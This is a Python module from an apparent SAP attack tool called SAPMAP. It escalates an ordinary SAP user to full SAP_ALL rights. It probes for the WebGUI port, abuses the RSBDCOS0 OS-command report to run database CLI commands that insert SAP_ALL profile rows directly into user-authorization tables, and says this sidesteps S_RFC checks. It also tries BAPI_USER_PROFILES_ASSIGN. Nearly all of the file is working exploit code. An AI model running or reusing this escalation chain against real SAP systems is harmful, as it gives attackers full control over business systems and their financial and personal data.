#!/usr/bin/env python3
"""
SAPMAP Local Privilege Escalation — Assign SAP_ALL to an existing user.

Uses a plugin/registry pattern: each LPE method is a decorated function
that takes (node, creds) and returns True on success.  Methods are tried
in priority order until one succeeds.

To add a new method, simply define a function with the @lpe_method
decorator anywhere in this file (or import-time side-effect from
another module).  It will automatically appear in the try-all chain.
"""

import logging
import re
import urllib.parse
from dataclasses import dataclass, field
from typing import Callable, List, Optional

import requests
import urllib3

from sapmap_models import SAPNode, Credentials
from sapmap_config import (
    SQL_GENERATORS, normalize_db_type, DB_CLI_COMMANDS,
)

urllib3.disable_warnings()
logger = logging.getLogger(__name__)


# ---------------------------------------------------------------------------
# LPE Method Registry
# ---------------------------------------------------------------------------

@dataclass
class LPEMethod:
    name: str
    description: str
    fn: Callable[[SAPNode, Credentials], bool]
    priority: int  # lower = tried first

_LPE_REGISTRY: List[LPEMethod] = []


def lpe_method(name: str, description: str, priority: int = 100):
    """Decorator to register an LPE method."""
    def decorator(fn):
        _LPE_REGISTRY.append(LPEMethod(
            name=name, description=description, fn=fn, priority=priority,
        ))
        _LPE_REGISTRY.sort(key=lambda m: m.priority)
        return fn
    return decorator


def get_lpe_methods() -> List[LPEMethod]:
    """Return all registered LPE methods (sorted by priority)."""
    return list(_LPE_REGISTRY)


# ---------------------------------------------------------------------------
# Main entry point
# ---------------------------------------------------------------------------

def try_lpe(node: SAPNode, creds: Credentials,
            method_name: str = None) -> bool:
    """Try to escalate *creds* to SAP_ALL on *node*.

    If *method_name* is given, only that method is attempted.
    Otherwise all registered methods are tried in priority order.
    Returns True as soon as one method succeeds.
    """
    methods = _LPE_REGISTRY
    if method_name:
        methods = [m for m in methods if m.name == method_name]
        if not methods:
            print(f"[-] Unknown LPE method: {method_name}")
            return False

    print(f"[*] === Local Privilege Escalation for "
          f"{creds.username}@{node.sid} client {creds.client} ===")

    for m in methods:
        print(f"[*] Trying LPE method: {m.name} — {m.description}")
        try:
            if m.fn(node, creds):
                print(f"[+] LPE succeeded via {m.name}!")
                return True
            print(f"[-] LPE method {m.name}: did not succeed")
        except Exception as e:
            logger.debug(f"LPE {m.name} error: {e}")
            print(f"[-] LPE method {m.name} error: {e}")

    print(f"[-] All LPE methods exhausted for {creds.username}@{node.sid}")
    return False


# ---------------------------------------------------------------------------
# Helpers: WebGUI roundtrip protocol
# ---------------------------------------------------------------------------

def _find_webgui_port(host: str, instance_nr: str = "00") -> Optional[int]:
    """Probe common SAP ICM HTTP(S) ports and return the first working one."""
    inst = int(instance_nr) if instance_nr else 0
    candidates = [
        (f"https://{host}:8000", True),
        (f"http://{host}:8000", False),
        (f"https://{host}:{8000 + inst}", True),
        (f"http://{host}:{8000 + inst}", False),
        (f"https://{host}:{44300 + inst * 100}", True),
        (f"http://{host}:{8080}", False),
    ]
    for url, use_ssl in candidates:
        try:
            r = requests.get(
                f"{url}/sap/public/info", timeout=4, verify=False,
                allow_redirects=False,
            )
            if r.status_code in (200, 301, 302, 401, 403):
                return url  # return the full base URL
        except Exception:
            continue
    return None


def _webgui_open_rsbdcos0(session: requests.Session, base_url: str,
                           creds: Credentials):
    """Open RSBDCOS0 selection screen via WebGUI. Returns (post_url, moin)."""
    tcode = "*SE38 RS38M-PROGRAMM=RSBDCOS0;DYNP_OKCODE=strt"
    url = (f"{base_url}/sap/bc/gui/sap/its/webgui"
           f"?sap-client={creds.client}&sap-language=EN"
           f"&~transaction={urllib.parse.quote(tcode)}")

    r = session.get(url, timeout=20, verify=False)
    if r.status_code != 200:
        return None, None

    fa = re.findall(r'action="([^"]+)"', r.text)
    m = re.findall(r'var moin\s*=\s*"([^"]+)"', r.text)
    if not fa or not m:
        return None, None

    post_url = f"{base_url}{fa[0]}"
    moin = m[0]

    # Initial roundtrip to load the RSBDCOS0 selection screen
    r2 = session.post(
        post_url,
        data=(f"sap-charset=utf-8"
              f"&~SEC_SESSTOKEN={moin}"
              f"&sap-wd-secure-id={moin}"
              f"&fkey=ENTER&~okcode="),
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        timeout=20, verify=False,
    )
    if r2.status_code != 200:
        return None, None

    # Extract the (possibly updated) moin
    m2 = re.findall(r"moin:'([^']+)'", r2.text)
    moin = m2[0] if m2 else moin

    # Verify we're on the RSBDCOS0 screen
    if "Execute OS Command" not in r2.text:
        return None, None

    return post_url, moin


def _webgui_exec_command(session: requests.Session, post_url: str,
                         moin: str, command: str) -> Optional[str]:
    """Execute an OS command via WebGUI RSBDCOS0 and return the response text.

    Uses the state/ur URL pattern with field value in the path and
    the moin token + ~RG_WEBGUI=X in the POST body.
    """
    # The command field on RSBDCOS0 is wnd[0]/usr/txt[0,8]
    field_sid = "wnd[0]/usr/txt[0,8]"
    encoded_field = urllib.parse.quote(field_sid, safe="")
    encoded_cmd = urllib.parse.quote(command, safe="")

    base_action = post_url.rstrip("/")
    state_url = f"{base_action}/state/ur;{encoded_field}={encoded_cmd}"

    body = f"moin={moin}&~RG_WEBGUI=X&sap-statistics=true&fkey=F8"

    r = session.post(
        state_url, data=body,
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        timeout=30, verify=False,
    )
    if r.status_code != 200:
        return None

    # Update moin from response
    m = re.findall(r"moin:'([^']+)'", r.text)
    new_moin = m[0] if m else moin

    return r.text, new_moin


# ---------------------------------------------------------------------------
# Helpers: SQL generation for SAP_ALL assignment (no user creation)
# ---------------------------------------------------------------------------

def _sql_assign_sap_all(sid: str, client: str, username: str,
                        db_type: str) -> list:
    """Generate SQL INSERTs for SAP_ALL profile assignment only.

    Unlike the full SQL generators in sapmap_config.py which also
    create the USR02 user record, this returns only the profile and
    authorization object INSERTs (UST04, USR04, USRBF2).
    """
    db_key = normalize_db_type(db_type)
    sql_gen = SQL_GENERATORS.get(db_key)
    if not sql_gen:
        return []
    all_sql = sql_gen(sid, client, username)
    return [
        s for s in all_sql
        if s.strip().upper().startswith("INSERT")
        and any(t in s for t in ("UST04", "USR04", "USRBF2"))
    ]


def _build_os_command_for_sql(sql: str, db_type: str, sid: str,
                               instance_nr: str = "00") -> Optional[str]:
    """Wrap a single SQL statement in the appropriate DB CLI command."""
    db_key = normalize_db_type(db_type)

    if db_key in ("ADA", "MAXDB", "ADABAS"):
        return f"sqlcli -U DEFAULT \"{sql}\""
    elif db_key == "MSS":
        return f"sqlcmd -S localhost -Q \"{sql}\""
    elif db_key in ("HDB", "HANA"):
        inst = int(instance_nr) if instance_nr else 0
        hana_port = 30015 + inst * 100
        return (f"/usr/sap/{sid.upper()}/hdbclient/hdbsql "
                f"-n localhost:{hana_port} -U DEFAULT \"{sql}\"")
    elif db_key in ("ORA", "ORACLE"):
        return f"echo \"{sql}\" | sqlplus -S / as sysdba"
    elif db_key in ("DB6", "DB2"):
        return f"db2 \"{sql}\""
    return None


# ===================================================================
# LPE METHOD: WebGUI RSBDCOS0 + SQL INSERT
# ===================================================================

@lpe_method(
    "webgui_rsbdcos0",
    "Execute OS commands via WebGUI RSBDCOS0 to assign SAP_ALL via DB SQL",
    priority=50,
)
def lpe_webgui_rsbdcos0(node: SAPNode, creds: Credentials) -> bool:
    """Escalate via WebGUI: open RSBDCOS0 and execute SQL INSERTs for SAP_ALL.

    This bypasses S_RFC authorization because the WebGUI runs transactions
    in dialog mode on the application server — only S_TCODE and object-level
    authorizations apply (not S_RFC).
    """
    host = node.ip or node.hostname
    if not host:
        print("[-] No IP/hostname available")
        return False

    db_type = node.db_type or ""
    db_key = normalize_db_type(db_type)
    if not db_key or db_key not in SQL_GENERATORS:
        print(f"[-] Unknown DB type: {db_type!r} — cannot generate SQL")
        return False

    inst_nr = creds.instance_nr or "00"

    # Find the WebGUI HTTP port
    print(f"[*] Searching for WebGUI HTTP port on {host}...")
    base_url = _find_webgui_port(host, inst_nr)
    if not base_url:
        print("[-] No WebGUI HTTP port found")
        return False
    print(f"[+] WebGUI at {base_url}")

    # Set up authenticated session
    session = requests.Session()
    session.auth = (creds.username, creds.password)
    session.verify = False

    # Open RSBDCOS0
    print(f"[*] Opening RSBDCOS0 via WebGUI...")
    post_url, moin = _webgui_open_rsbdcos0(session, base_url, creds)
    if not post_url or not moin:
        print("[-] Could not open RSBDCOS0 selection screen")
        return False
    print(f"[+] RSBDCOS0 selection screen loaded")

    # Generate the SAP_ALL SQL statements
    sid = node.sid or "SAP"
    sql_stmts = _sql_assign_sap_all(sid, creds.client, creds.username, db_type)
    if not sql_stmts:
        print("[-] No SQL statements generated — check DB type")
        return False
    print(f"[*] {len(sql_stmts)} SQL statements to execute for SAP_ALL assignment")

    # Execute each SQL via RSBDCOS0
    executed = 0
    for i, sql in enumerate(sql_stmts):
        os_cmd = _build_os_command_for_sql(sql, db_type, sid, inst_nr)
        if not os_cmd:
            continue

        print(f"[*] [{i+1}/{len(sql_stmts)}] Executing: {sql[:70]}...")
        result = _webgui_exec_command(session, post_url, moin, os_cmd)
        if result is None:
            print(f"[-] Roundtrip failed")
            continue

        resp_text, moin = result  # unpack updated moin
        executed += 1

        # For HANA/MaxDB we might need to re-open RSBDCOS0 for each command
        # because the output screen replaces the selection screen.
        # Re-open for the next command.
        if i < len(sql_stmts) - 1:
            post_url, moin = _webgui_open_rsbdcos0(session, base_url, creds)
            if not post_url:
                print("[-] Could not re-open RSBDCOS0 for next command")
                break

    print(f"[*] Executed {executed}/{len(sql_stmts)} SQL statements")

    if executed == 0:
        return False

    # The user buffer needs to be refreshed for SAP_ALL to take effect.
    # This happens automatically on next logon, but we can also try
    # executing "sapcontrol -prot NI_HTTP -nr XX -function ABAPSoftRestart"
    # or simply advise the user to re-logon.
    print(f"[+] SAP_ALL assigned to {creds.username} via database INSERTs")
    print(f"[!] Note: User {creds.username} may need to re-logon for the")
    print(f"    new authorizations to take effect (user buffer refresh).")
    return True


# ===================================================================
# LPE METHOD: BAPI_USER_PROFILES_ASSIGN (direct RFC, if authorized)
# ===================================================================

@lpe_method(
    "bapi_profiles_assign",
    "Assign SAP_ALL directly via BAPI_USER_PROFILES_ASSIGN (requires S_RFC)",
    priority=10,
)
def lpe_bapi_profiles_assign(node: SAPNode, creds: Credentials) -> bool:
    """Try the simplest approach: call BAPI_USER_PROFILES_ASSIGN directly.

    This only works if the user already has S_RFC authorization for the
    relevant function group.  Many users won't, which is why this has
    low priority number (tried first — it's fast and harmless if it fails).
    """
    try:
        from sap_rfc_ctypes import RFCConnection
    except ImportError:
        return False

    import sapmap_rfc

    host = node.ip or node.hostname
    if not host:
        return False

    try:
        with sapmap_rfc._get_connection(node, creds) as conn:
            result = conn.call(
                "BAPI_USER_PROFILES_ASSIGN",
                USERNAME=creds.username,
                PROFILES=[
                    {"BAPIPROF": "SAP_ALL"},
                    {"BAPIPROF": "SAP_NEW"},
                ],
            )
            ret = result.get("RETURN", {})
            if isinstance(ret, dict):
                ret = [ret]
            for r in ret:
                if r.get("TYPE", "") in ("E", "A"):
                    print(f"[-] BAPI error: {r.get('MESSAGE', '?')}")
                    return False

            # Commit the change
            conn.call("BAPI_TRANSACTION_COMMIT", WAIT="X")
            print(f"[+] SAP_ALL + SAP_NEW assigned via BAPI")
            return True
    except Exception as e:
        logger.debug(f"BAPI_USER_PROFILES_ASSIGN failed: {e}")
        err = str(e).split("\n")[0]
        print(f"[-] RFC call failed: {err}")
        return False
